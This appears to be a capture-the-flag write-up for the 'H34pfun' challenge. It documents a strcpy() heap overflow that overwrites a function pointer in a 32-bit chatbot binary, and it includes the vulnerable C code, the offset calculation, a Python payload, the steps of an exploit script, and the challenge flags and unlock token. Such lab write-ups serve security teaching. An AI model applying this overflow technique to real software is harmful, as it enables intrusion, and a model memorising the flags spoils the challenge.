# PoC — Challenge 06: H34pfun

**Flag:** `EPI{H34p_1S_4_M0Ns73r_0n_17S_0wN}`
**Vulnerability:** Heap overflow via `strcpy()` — overwrite adjacent chunk's function pointer
**Binary:** `/usr/bin/chatbot/chatbot` (32-bit non-PIE, port 44444)
**Access needed:** SSH as `junior-dev` (to reach localhost:44444)

---

## Vulnerability

`verify_access()` allocates two heap chunks consecutively:

```c
struct credentials { char password[48]; };   // sizeof = 48
struct callback    { void (*fun)(int); };     // sizeof = 4

struct credentials *d = malloc(sizeof(*d));  // 64-byte chunk (MALLOC_ALIGNMENT=16)
struct callback    *f = malloc(sizeof(*f));  // chunk starts 64 bytes after d's data
f->fun = unallowed_access;

strcpy(d->password, lower + 22);  // no bounds check — overflows into f->fun
f->fun(fd);                        // calls whatever we wrote
```

With `MALLOC_ALIGNMENT=16`, `malloc(48)` returns a 64-byte chunk. `f` is allocated immediately after, so `f->fun` is exactly **64 bytes** past `d->password[0]`.

By sending `"access protected area " + 64_bytes_padding + address_of_protected_area`, we redirect the call to `protected_area()`, which prints the flag and spawns the preprod chatbot.

**Trigger:** Send the chatbot token first (from `/usr/bin/chatbot/lockcode`), then the payload.  
**Note:** `protected_area()` address changes each server relaunch (binary is recompiled). Auto-detected by compiling source on remote.

---

## Exploit

```bash
# Run the automated exploit:
python3 challenges/06_h34pfun/scripts/exploit_chatbot.py <SSH_PORT>
```

**What the script does:**
1. SSH as `junior-dev`, compiles `chatbot_clean.c` on remote to get current `protected_area` address
2. Sends the unlock token (`EPI{1_H0P3_Y0uLL_g1v3_m3_4_C4Ll84ck}`)
3. Sends the heap overflow payload via remote Python socket to localhost:44444

**Payload construction:**
```python
import struct
OFFSET = 64  # confirmed: malloc(48) → 64-byte chunk, f->fun at d->password + 64
protected_area = 0x<AUTO_DETECTED>

payload = b"access protected area " + b"A" * OFFSET + struct.pack("<I", protected_area)
```

**Side effect:** `protected_area()` spawns `chatbot-preprod` on port 55555 — required for H34pG0t.

**Flag:** `EPI{H34p_1S_4_M0Ns73r_0n_17S_0wN}`
